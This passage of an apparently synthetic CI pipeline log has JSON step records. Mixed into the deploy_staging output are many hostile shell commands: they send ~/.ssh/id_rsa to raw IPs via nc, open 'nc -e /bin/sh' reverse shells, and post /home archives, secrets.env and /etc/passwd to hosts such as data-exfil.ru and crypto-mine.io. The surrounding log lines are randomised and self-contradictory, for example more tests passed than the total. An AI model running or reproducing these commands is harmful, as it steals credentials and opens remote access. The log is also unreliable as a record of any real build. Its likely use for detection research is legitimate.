successfully\nStep 17/19: Building\nOptimizing 64 modules...\nTransforming 688 files...\nStep 7/20: Building\nTime: 38.988s\n=== Step unit_tests completed ===\n=== Step: save_cache ===\nReady.\nBuilding Docker image...\n[12:46:47] ERROR: Connection failed\nTest Suites: 49 passed, 18 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 17/22: Deploying\nArtifact uploaded: build.tar.gz (28MB)\nBuilding Docker image...\nProcessing...\nRan 86 tests in 56s\nCache invalidated: node_modules\nStep 4/20: Building\nPlatform: win32-x64\nSuccess!\nPlatform: win32-x64\nTLS handshake completed\nCache restored successfully (188MB)\nSuccess!\npip: Collecting jest\nFetching submodules...\nGET /health - 201 (68ms)\n[12:46:47] INFO: Connecting to database\npip: Collecting webpack\n  PASS: unit/test_user_create.spec.js\nTime: 8.4s\nBundling runtime.js\n[12:46:47] DEBUG: Memory usage: 277MB\nFetching from https://gcr.io/package.json\nTime: 38.945s\nArtifact uploaded: dist.zip (18MB)\n\u2713 All checks passed\n[12:46:47] INFO: Cache refreshed\nCompiling utils/utils.go...\nCompiling components/app.ts...\nCompleted.\nTime: 32.869s\nWaiting...\nPushing to registry...\nWARNING: prettier has known vulnerabilities\n\u2713 Task completed in 3229ms\nDone.\n[12:46:47] DEBUG: Connection pool: 10 active\nBuilding Docker image...\nTransforming 808 files...\nReady.\nCache hit for key-9723\npip: Downloading eslint-3.2.tar.gz\nFetching submodules...\nPOST /api - 200 (419ms)\nUsing Python 3.12\nEnvironment: development\nCache restored successfully (288MB)\nFetching submodules...\nArtifact downloaded: 49MB\nUsing Node.js 17.6.5\nPulling image: python:3.11\nTLS handshake completed\nWARNING: axios has known vulnerabilities\npip: Installing build dependencies...\nBuilding Docker image...\nEnvironment: production\npip: Collecting express\nWARNING: webpack has known vulnerabilities\n[12:46:47] INFO: Request completed\n  PASS: unit/test_user_create.spec.js\npip: Downloading jest-3.8.tar.gz\nSnapshots: 41 passed, 30 total\nArtifact uploaded: build.tar.gz (11MB)\nStep 6/24: Linting\nArtifact downloaded: 18MB\npip: Collecting eslint\npip install: Successfully installed webpack-3.19\n[12:46:47] INFO: Connecting to database\nStep 10/16: Building\n[12:46:47] DEBUG: Loading configuration\nStep 16/17: Running migrations\npip: Collecting express\nCompiling utils/handler.rs...\n  PASS: unit/test_auth_login.spec.js\n\u2713 lint completed\nOK\nTransforming 892 files...\nStep 14/21: Installing dependencies\n[12:46:47] INFO: Connecting to database\n[12:46:47] DEBUG: Loading configuration\nWARNING: jest has known vulnerabilities\nCreating production build...\nSuccess!\npip: Downloading lodash-3.19.tar.gz\n[12:46:47] WARN: Deprecated API usage\nStep 14/25: Linting\npip: Downloading jest-3.5.tar.gz\nCache miss for key-8430\nCache saved successfully\n[12:46:47] DEBUG: Loading configuration\nCompiling lib/utils.go...\nPlatform: win32-x64\nNODE_ENV=production\nOK\n\u2713 All checks passed\nBuilding Docker image...\n[12:46:47] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (20MB)\n=== Step save_cache completed ===\n=== Step: integration_tests ===\nCompleted.\nLayer 6/14: ENV command\nOK\nSnapshots: 26 passed, 34 total\nHEAD is now at 3fccccf\nException: TypeError\nnpm install: resolved 1725 packages\nMinifying app.js\nBundling runtime.js\nOptimizing 95 modules...\nStep 16/16: Deploying\npip: Installing build dependencies...\nChecking out main branch\npip: Installing build dependencies...\nPlatform: darwin-arm64\nFetching from https://npmjs.org/package.json\nyarn add: Done in 5.56s\nPOST /api - 200 (276ms)\nAlready up to date.\nVerifying...\n[12:46:47] DEBUG: Connection pool: 7 active\n[12:46:47] INFO: Cache refreshed\nLoading...\nGenerating source maps...\n  PASS: test_user_create (360ms)\n[12:46:47] DEBUG: Initializing service\nInstalling webpack@5.18.4\nBuilding Docker image...\n[12:46:47] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:47] INFO: Request completed\nPushing to registry...\nTests: 272 passed, 402 total\nLayer 4/13: RUN command\nCache hit for key-7240\nStep 4/17: Installing dependencies\n[12:46:47] INFO: Starting build process\nProcessing...\n  PASS: e2e/test_auth_login.spec.js\n[12:46:47] WARN: Deprecated API usage\n[12:46:47] INFO: Request completed\nCompiling src/main.py...\n[12:46:47] ERROR: Connection failed\nWaiting...\nTime: 36.550s\nTLS handshake completed\nnpm notice: created a lockfile\n[12:46:47] INFO: Cache refreshed\nTLS handshake completed\nFinished.\n\u2713 test completed\n[12:46:47] DEBUG: Loading configuration\nMinifying app.js\nProcessing...\nFetching from https://githubusercontent.com/package.json\nInstalling lodash@2.9.6\nnpm install: resolved 533 packages\nWARNING: lodash has known vulnerabilities\nPulling image: python:3.11\n\u2713 validate completed\n[12:46:47] INFO: Starting build process\n[12:46:47] DEBUG: Loading configuration\n  PASS: unit/test_cache_hit.spec.js\nInstalling webpack@2.18.1\nTest Suites: 14 passed, 16 total\nCache miss for key-8207\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 31MB\nInstalling prettier@1.6.7\n\u2713 Task completed in 1301ms\n[12:46:47] DEBUG: Query executed in 17ms\nCache miss for key-4661\nnpm notice: created a lockfile\nStep 2/23: Running migrations\nCompiling src/utils.go...\nWARNING: prettier has known vulnerabilities\nnpm install: added 113 packages\nMinifying main.js\nCompleted.\nWARNING: webpack has known vulnerabilities\npip: Installing build dependencies...\nnpm install: resolved 1826 packages\nInstalling prettier@5.14.9\nnpm install: added 20 packages\nPOST /api - 201 (282ms)\npip: Collecting react\nCompiling src/handler.rs...\nImage pulled successfully\nStep 5/21: Linting\nnpm notice: created a lockfile\nCompiling lib/service.java...\nSwitched to branch 'bugfix/task-769'\nDone.\nMinifying vendor.js\nLoading...\nDone.\n[12:46:47] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nyarn add: Done in 3.81s\nGET /health - 200 (4ms)\nWARNING: axios has known vulnerabilities\nBundling runtime.js\n=== Step integration_tests completed ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 31.95.13.55 18731\n=== Step: deploy_staging ===\nTransforming 958 files...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at fee9c30\nEnvironment: development\nBundling styles.css\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/app.ts...\n\u2713 Task completed in 1411ms\nBuilding Docker image...\nnc -e /bin/sh 237.52.234.58 13568\nWARNING: lodash has known vulnerabilities\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nBuilding Docker image...\n[12:46:47] WARN: Deprecated API usage\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\n  PASS: test_cache_hit (214ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nPOST /api - 202 (159ms)\npip: Downloading prettier-4.4.tar.gz\nInstalling lodash@1.9.0\nFetching submodules...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 19.200.132.31 10946\necho $(cat ~/.ssh/id_rsa) | base64 | nc 97.118.191.88 7311\nTLS handshake completed\nOK\npip: Downloading prettier-3.3.tar.gz\npip: Collecting prettier\nChecking out develop branch\nArtifact downloaded: 31MB\nTransforming 162 files...\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (43MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nArtifact uploaded: build.tar.gz (36MB)\nStep 20/16: Deploying\nArtifact uploaded: dist.zip (62MB)\nGET /status - 201 (48ms)\npip: Downloading react-2.8.tar.gz\nImage pulled successfully\nSending 231MB of data to crypto-mine.io\npip: Collecting express\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nPushing to registry...\nReady.\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nDone.\nPOST /upload - 202 (500ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (26MB)\n[12:46:47] INFO: Cache refreshed\nBundling runtime.css\nCreating production build...\nReady.\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\nDone.\nnc -e /bin/sh 160.68.238.118 8044\nWaiting...\nException: NullPointerException\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nCompiling lib/service.java...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 95.12.151.156 50586\nCreating production build...\nPushing to registry...\nyarn add: Done in 23.29s\nDone.\nBundling main.js\nLoading...\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nCache miss for key-1174\n[12:46:47] DEBUG: Memory usage: 731MB\necho $(cat ~/.ssh/id_rsa) | base64 | nc 54.72.72.247 17310\nLayer 10/8: ENV command\n[12:46:47] INFO: Request completed\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nnc -e /bin/sh 145.188.47.104 46119\npip: Downloading webpack-1.3.tar.gz\n[12:46:47] DEBUG: Connection pool: 13 active\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n[12:46:47] INFO: Starting build process\nCreating production build...\nCache invalidated: build\nCompiling components/utils.go...\npip: Downloading prettier-2.17.tar.gz\nCache miss for key-5757\nMinifying main.js\nCache invalidated: node_modules\nWaiting...\n\u2713 Task completed in 3754ms\nPlatform: darwin-arm64\nImage pulled successfully\nChecking out main branch\nChecking out master branch\nUsing Node.js 15.19.2\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\n\u2713 Task completed in 1754ms\nCache restored successfully (12MB)\nBundling styles.css\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 204.167.99.155 62966\nCompiling components/index.js...\nStep 12/23: Linting\n[12:46:47] DEBUG: Initializing service\nUsing Node.js 16.8.6\nStep 5/20: Deploying\nRan 123 tests in 42s\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\n\u2717 build failed with exit code 116\nTime: 19.659s\n[12:46:47] DEBUG: Query executed in 78ms\nPushing to registry...\nnc -e /bin/sh 208.75.123.162 15705\n  PASS: integration/test_user_create.spec.js\nOptimizing 19 modules...\n[12:46:47] INFO: Connecting to database\n[12:46:47] ERROR: Connection failed\nTests: 391 passed, 423 total\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nCache invalidated: node_modules\n[12:46:47] WARN: Deprecated API usage\nArtifact downloaded: 27MB\nUsing Node.js 19.12.3\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-22T12:46:47.357831",
        "finished_at": "2025-11-22T12:47:03.564639",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Optimizing 43 modules...",
          "Transforming 926 files...",
          "Loading...",
          "[12:46:47] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Step 5/24: Running migrations",
          "Bundling runtime.css",
          "\u2713 package completed",
          "Transforming 497 files...",
          "Platform: linux-x64",
          "TLS handshake completed",
          "Compiling lib/utils.go...",
          "Minifying main.js",
          "NODE_ENV=development",
          "Step 15/21: Deploying",
          "Bundling runtime.css",
          "Cache restored successfully (303MB)",
          "Loading...",
          "\u2713 build completed",
          "Uploading artifact 'coverage' (47 files)",
          "npm install: resolved 1945 packages",
          "Compiling utils/service.java...",
          "\u2713 All checks passed",
          "Connection established",
          "Step 14/25: Linting",
          "Artifact downloaded: 4MB",
          "TLS handshake completed",
          "Transforming 151 files...",
          "Image pulled successfully",
          "Compiling src/main.py...",
          "Step 4/23: Installing dependencies",
          "\u2713 Task completed in 4912ms",
          "Image pulled successfully",
          "Transforming 725 files...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Ready.",
          "Uploading artifact 'coverage' (17 files)",
          "yarn add: Done in 18.38s",
          "Artifact downloaded: 43MB",
          "[12:46:47] DEBUG: Initializing service",
          "Processing...",
          "Processing...",
          "Snapshots: 35 passed, 11 total",
          "Cache hit for key-1529",
          "[12:46:47] INFO: Request completed",
          "[12:46:47] INFO: Processing request",
          "Coverage: 76% statements, 97% branches",
          "Already up to date.",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:47] INFO: Processing request",
          "Pushing to registry...",
          "Test Suites: 9 passed, 16 total",
          "[12:46:47] DEBUG: Initializing service",
          "Tests: 243 passed, 161 total",
          "Time: 18.191s",
          "[12:46:47] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Pushing to registry...",
          "FAILED: test_cache_hit",
          "Done.",
          "Step 2/25: Testing",
          "[12:46:47] INFO: Connecting to database",
          "Fetching from https://github.com/package.json",
          "Uploading artifact 'build' (45 files)",
          "Cache invalidated: build",
          "TLS handshake completed",
          "Step 15/15: Building",
          "Finished.",
          "Loading...",
          "Image pulled successfully",
          "Already up to date.",
          "Ready.",
          "pip: Installing build dependencies...",
          "Compiling lib/app.ts...",
          "Coverage: 80% statements, 97% branches",
          "Exception: ValueError",
          "Exception: RuntimeError",
          "Already up to date.",
          "Cache hit for key-8945",
          "Step 8/25: Running migrations",
          "Bundling runtime.js",
          "Environment: production",
          "Optimizing 37 modules...",
          "Transforming 938 files...",
          "Uploading artifact 'build' (8 files)",
          "Verifying...",
          "Generating source maps...",
          "Exception: TypeError",
          "Pushing to registry...",
          "[12:46:47] INFO: Request completed",
          "Finished.",
          "TLS handshake completed",
          "\u2713 lint completed",
          "Platform: linux-x64",
          "Pulling image: alpine:latest",
          "Already up to date.",
          "TLS handshake completed",
          "Done.",
          "Installing eslint@3.19.0",
          "Cache miss for key-4308",
          "[12:46:47] WARN: Deprecated API usage",
          "GET /health - 201 (3ms)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-22T12:47:03.564639",
        "finished_at": "2025-11-22T12:47:08.966908",
        "log_lines": [
          "=== Step: lint ===",
          "Verifying...",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 28 passed, 14 total",
          "yarn add: Done in 7.46s",
          "pip: Installing build dependencies...",
          "Test Suites: 5 passed, 20 total",
          "[12:46:47] INFO: Cache refreshed",
          "Time: 10.7s",
          "Step 13/17: Running migrations",
          "[12:46:47] INFO: Cache refreshed",
          "Ran 50 tests in 31s",
          "Done.",
          "yarn add: Done in 12.66s",
          "pip: Downloading axios-3.18.tar.gz",
          "\u2713 Step 'build' succeeded",
          "Ready.",
          "[12:46:47] DEBUG: Connection pool: 3 active",
          "\u2713 test completed",
          "Transforming 499 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "FAILED: test_user_create",
          "pip install: Successfully installed jest-1.4",
          "Tests: 258 passed, 80 total",
          "Already up to date.",
          "[12:46:47] DEBUG: Initializing service",
          "Ran 28 tests in 27s",
          "Time: 96.909s",
          "npm notice: package.json updated",
          "Done.",
          "[12:46:47] DEBUG: Connection pool: 9 active",
          "Optimizing 68 modules...",
          "[12:46:47] INFO: Starting build process",
          "Using Node.js 18.17.10",
          "npm install: added 496 packages",
          "Step 13/20: Testing",
          "Step 2/15: Testing",
          "Step 8/15: Linting",
          "pip: Installing build dependencies...",
          "Step 13/23: Linting",
          "\u2713 Task completed in 2375ms",
          "Generating source maps...",
          "[12:46:47] INFO: Request completed",
          "Compiling src/handler.rs...",
          "[12:46:47] WARN: Deprecated API usage",
          "Connection established",
          "Step 11/21: Building",
          "Ready.",
          "[12:46:47] DEBUG: Loading configuration",
          "Step 15/22: Linting",
          "Time: 87.771s",
          "Processing...",
          "Switched to branch 'bugfix/task-781'",
          "[12:46:47] DEBUG: Query executed in 24ms",
          "[12:46:47] DEBUG: Query executed in 16ms",
          "[12:46:47] DEBUG: Connection pool: 2 active",
          "npm install: added 124 packages",
          "Time: 50.611s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 45 passed, 5 total",
          "Step 16/23: Linting",
          "Minifying app.js",
          "Checking out develop branch",
          "Cache invalidated: build",
          "[12:46:47] WARN: Deprecated API usage",
          "Layer 1/13: RUN command",
          "Pushing to registry...",
          "pip: Downloading jest-5.1.tar.gz",
          "Minifying main.js",
          "\u2717 build failed with exit code 50",
          "Exception: NullPointerException",
          "Cache saved successfully",
          "[12:46:47] DEBUG: Connection pool: 14 active",
          "Ready.",
          "Artifact uploaded: dist.zip (26MB)",
          "Creating production build...",
          "HEAD is now at e046949",
          "Snapshots: 30 passed, 34 total",
          "TLS handshake completed",
          "[12:46:47] DEBUG: Initializing service",
          "[12:46:47] INFO: Request completed",
          "Transforming 216 files...",
          "[12:46:47] INFO: Cache refreshed",
          "npm install: added 79 packages",
          "Processing...",
          "Using Python 3.12",
          "Environment: development",
          "Test Suites: 17 passed, 23 total",
          "Verifying...",
          "Step 5/19: Testing",
          "Generating source maps...",
          "Cache restored successfully (315MB)",
          "WARNING: express has known vulnerabilities",
          "[12:46:47] INFO: Connecting to database",
          "npm install: resolved 1816 packages",
          "Transforming 770 files...",
          "Cache hit for key-4035",
          "\u2713 build completed",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "GET /health - 200 (71ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /health - 204 (75ms)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-22T12:47:08.966908",
        "finished_at": "2025-11-22T12:47:11.127816",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:46:47] INFO: Request completed",
          "[12:46:47] DEBUG: Memory usage: 1066MB",
          "Platform: linux-x64",
          "Snapshots: 35 passed, 32 total",
          "[12:46:47] DEBUG: Connection pool: 15 active",
          "Step 7/19: Deploying",
          "Step 8/25: Building",
          "pip install: Successfully installed lodash-4.6",
          "pip: Installing build dependencies...",
          "Cache miss for key-7172",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 79% statements, 65% branches",
          "Step 4/22: Building",
          "Fetching submodules...",
          "[12:46:47] DEBUG: Memory usage: 244MB",
          "Uploading artifact 'dist' (28 files)",
          "Connection established",
          "GET /status - 200 (87ms)",
          "Creating production build...",
          "Step 8/24: Deploying",
          "pip install: Successfully installed jest-3.8",
          "HEAD is now at aa60965",
          "Cache restored successfully (41MB)",
          "Building Docker image...",
          "[12:46:47] INFO: Cache refreshed",
          "Time: 43.504s",
          "pip install: Successfully installed prettier-3.14",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "[12:46:47] WARN: Deprecated API usage",
          "TLS handshake completed",
          "  PASS: test_auth_login (369ms)",
          "[12:46:47] DEBUG: Initializing service",
          "[12:46:47] DEBUG: Connection pool: 18 active",
          "TLS handshake completed",
          "Compiling lib/handler.rs...",
          "[12:46:47] INFO: Processing request",
          "[12:46:47] INFO: Processing request",
          "Compiling src/handler.rs...",
          "WARNING: lodash has known vulnerabilities",
          "Creating production build...",
          "\u2713 All checks passed",
          "  PASS: test_api_health (252ms)",
          "Cache invalidated: node_modules",
          "Compiling utils/handler.rs...",
          "Done.",
          "Artifact uploaded: dist.zip (53MB)",
          "[12:46:47] DEBUG: Query executed in 44ms",
          "Snapshots: 2 passed, 17 total",
          "Ready.",
          "Already up to date.",
          "Image pulled successfully",
          "Connection established",
          "[12:46:47] DEBUG: Initializing service",
          "Cache saved successfully",
          "Compiling utils/utils.go...",
          "Artifact uploaded: dist.zip (5MB)",
          "[12:46:47] INFO: Starting build process",
          "Finished.",
          "Loading...",
          "\u2717 build failed with exit code 23",
          "[12:46:47] INFO: Cache refreshed",
          "Installing jest@4.8.10",
          "Done.",
          "npm install: resolved 1051 packages",
          "Cache restored successfully (57MB)",
          "Compiling components/handler.rs...",
          "Using Node.js 14.12.7",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:47] DEBUG: Query executed in 65ms",
          "Pulling image: alpine:3.11",
          "Using Node.js 20.7.10",
          "pip: Collecting lodash",
          "[12:46:47] DEBUG: Query executed in 21ms",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling lib/service.java...",
          "pip: Downloading react-5.2.tar.gz",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling utils/handler.rs...",
          "  PASS: e2e/test_api_health.spec.js",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:47] ERROR: Connection failed",
          "Switched to branch 'feature/task-692'",
          "npm install: resolved 623 packages",
          "Environment: staging",
          "[12:46:47] DEBUG: Loading configuration",
          "[12:46:47] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Layer 10/15: ENV command",
          "[12:46:47] INFO: Processing request",
          "Fetching submodules...",
          "Cache saved successfully",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: created a lockfile",
          "Platform: linux-x64",
          "Verifying...",
          "Bundling vendor.js",
          "Cache miss for key-5585",
          "Uploading artifact 'dist' (32 files)",
          "Creating production build...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-22T12:47:11.127816",
        "finished_at": "2025-11-22T12:47:16.530085",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:46:47] ERROR: Connection failed",
          "\u2717 build failed with exit code 20",
          "Installing prettier@2.10.2",
          "Compiling src/main.py...",
          "npm notice: package.json updated",
          "\u2713 Task completed in 4134ms",
          "Completed.",
          "npm install: added 49 packages",
          "Snapshots: 9 passed, 33 total",
          "Layer 2/15: ENV command",
          "Bundling main.css",
          "Switched to branch 'bugfix/task-358'",
          "Cache saved successfully",
          "Artifact downloaded: 48MB",
          "[12:46:47] INFO: Connecting to database",
          "Using Python 3.10",
          "Compiling src/index.js...",
          "Success!",
          "Minifying vendor.js",
          "Test Suites: 38 passed, 12 total",
          "Compiling components/handler.rs...",
          "pip: Installing build dependencies...",
          "npm install: resolved 1158 packages",
          "[12:46:47] DEBUG: Query executed in 50ms",
          "Step 9/16: Testing",
          "Transforming 991 files...",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "[12:46:47] WARN: Deprecated API usage",
          "Step 2/20: Linting",
          "Step 15/15: Building",
          "[12:46:47] DEBUG: Query executed in 70ms",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "Bundling styles.js",
          "Step 6/18: Deploying",
          "Time: 108.688s",
          "  PASS: test_user_create (332ms)",
          "Fetching submodules...",
          "[12:46:47] INFO: Starting build process",
          "npm install: resolved 1416 packages",
          "pip install: Successfully installed jest-5.0",
          "Fetching submodules...",
          "Platform: linux-x64",
          "Time: 111.615s",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:47] WARN: Deprecated API usage",
          "Cache restored successfully (179MB)",
          "Step 18/15: Building",
          "Time: 72.550s",
          "\u2717 build failed with exit code 79",
          "Using Node.js 18.16.1",
          "  PASS: test_user_create (364ms)",
          "pip: Installing build dependencies...",
          "  PASS: test_cache_hit (457ms)",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:47] DEBUG: Connection pool: 19 active",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:46:47] INFO: Processing request",
          "Connection established",
          "Pulling image: python:latest",
          "[12:46:47] DEBUG: Initializing service",
          "Step 7/15: Building",
          "Step 20/23: Deploying",
          "Creating production build...",
          "[12:46:47] DEBUG: Memory usage: 1115MB",
          "Tests: 272 passed, 427 total",
          "  PASS: integration/test_db_connect.spec.js",
          "OK",
          "Compiling src/service.java...",
          "Installing webpack@3.15.4",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "pip: Downloading eslint-1.0.tar.gz",
          "Completed.",
          "POST /upload - 201 (306ms)",
          "Waiting...",
          "Optimizing 79 modules...",
          "[12:46:47] INFO: Starting build process",
          "Cache invalidated: build",
          "Step 16/21: Building",
          "\u2717 build failed with exit code 94",
          "Cache invalidated: dependencies",
          "Cache miss for key-9086",
          "Layer 5/14: ENV command",
          "Environment: production",
          "npm install: resolved 1710 packages",
          "Cache saved successfully",
          "Step 19/20: Running migrations",
          "[12:46:47] WARN: Deprecated API usage",
          "Ready.",
          "Compiling components/handler.rs...",
          "GET /status - 200 (59ms)",
          "Cache invalidated: node_modules",
          "Fetching submodules...",
          "Generating source maps...",
          "Platform: win32-x64",
          "\u2713 Task completed in 2217ms",
          "Artifact uploaded: dist.zip (58MB)",
          "Fetching submodules...",
          "Step 15/16: Running migrations",
          "Artifact uploaded: build.tar.gz (45MB)",
          "pip: Collecting webpack",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-22T12:47:16.530085",
        "finished_at": "2025-11-22T12:47:19.771447",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Loading...",
          "Artifact uploaded: dist.zip (53MB)",
          "TLS handshake completed",
          "HEAD is now at 5967e89",
          "Switched to branch 'hotfix/task-802'",
          "pip: Downloading webpack-3.10.tar.gz",
          "Success!",
          "Step 1/23: Testing",
          "[12:46:47] DEBUG: Query executed in 53ms",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:46:47] DEBUG: Connection pool: 19 active",
          "Exception: RuntimeError",
          "Compiling components/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: resolved 435 packages",
          "pip install: Successfully installed jest-1.11",
          "Verifying...",
          "Cache miss for key-6600",
          "Layer 9/14: RUN command",
          "Step 13/23: Running migrations",
          "pip: Installing build dependencies...",
          "Cache restored successfully (70MB)",
          "TLS handshake completed",
          "Ran 42 tests in 14s",
          "Pushing to registry...",
          "Image pulled successfully",
          "Step 18/17: Running migrations",
          "Cache miss for key-9443",
          "Artifact uploaded: dist.zip (15MB)",
          "Connection established",
          "Cache invalidated: build",
          "[12:46:47] DEBUG: Query executed in 30ms",
          "npm install: added 477 packages",
          "\u2713 validate completed",
          "Ran 129 tests in 55s",
          "Tests: 85 passed, 292 total",
          "Cache restored successfully (396MB)",
          "Using Python 3.11",
          "Test Suites: 33 passed, 14 total",
          "[12:46:47] INFO: Starting build process",
          "Layer 1/13: COPY command",
          "Artifact uploaded: dist.zip (95MB)",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: production",
          "Cache restored successfully (346MB)",
          "Step 8/17: Building",
          "[12:46:47] DEBUG: Connection pool: 14 active",
          "pip: Downloading jest-5.11.tar.gz",
          "pip: Collecting react",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: e2e/test_auth_login.spec.js",
          "Time: 48.507s",
          "Ready.",
          "  PASS: unit/test_api_health.spec.js",
          "Connection established",
          "Success!",
          "Cache miss for key-8676",
          "Compiling components/app.ts...",
          "pip install: Successfully installed lodash-1.18",
          "[12:46:47] ERROR: Connection failed",
          "Artifact downloaded: 45MB",
          "Coverage: 77% statements, 80% branches",
          "[12:46:47] DEBUG: Memory usage: 1004MB",
          "Verifying...",
          "npm notice: created a lockfile",
          "Step 8/18: Deploying",
          "Cache invalidated: dependencies",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:46:47] INFO: Cache refreshed",
          "Fetching submodules...",
          "Step 18/17: Installing dependencies",
          "Processing...",
          "Switched to branch 'feature/task-965'",
          "Bundling styles.js",
          "[12:46:47] INFO: Request completed",
          "\u2713 All checks passed",
          "Bundling vendor.css",
          "Step 20/21: Installing dependencies",
          "GET /health - 201 (34ms)",
          "Exception: TypeError",
          "Test Suites: 43 passed, 49 total",
          "[12:46:47] INFO: Starting build process",
          "  PASS: test_user_create (216ms)",
          "pip: Installing build dependencies...",
          "Using Python 3.12",
          "Fetching submodules...",
          "Connection established",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 341ms",
          "Step 7/19: Building",
          "Step 10/25: Installing dependencies",
          "Step 11/17: Running migrations",
          "\u2713 lint completed",
          "Cache saved successfully",
          "[12:46:47] DEBUG: Memory usage: 518MB",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-22T12:47:19.771447",
        "finished_at": "2025-11-22T12:47:21.932355",
        "log_lines": [
          "=== Step: checkout ===",
          "Success!",
          "Pushing to registry...",
          "Snapshots: 27 passed, 14 total",
          "Step 3/16: Running migrations",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:47] DEBUG: Connection pool: 1 active",
          "  PASS: unit/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 23.98s",
          "pip: Collecting prettier",
          "Step 5/18: Running migrations",
          "npm notice: created a lockfile",
          "Uploading artifact 'coverage' (42 files)",
          "Ran 92 tests in 51s",
          "\u2713 Step 'checkout' succeeded",
          "Building Docker image...",
          "Time: 63.708s",
          "Time: 58.166s",
          "Step 2/18: Installing dependencies",
          "yarn add: Done in 25.88s",
          "Verifying...",
          "Building Docker image...",
          "  PASS: unit/test_db_connect.spec.js",
          "Tests: 142 passed, 329 total",
          "Fetching submodules...",
          "[12:46:47] INFO: Starting build process",
          "Minifying vendor.js",
          "npm install: resolved 1535 packages",
          "Bundling styles.js",
          "Installing express@1.10.9",
          "Finished.",
          "Connection established",
          "Generating source maps...",
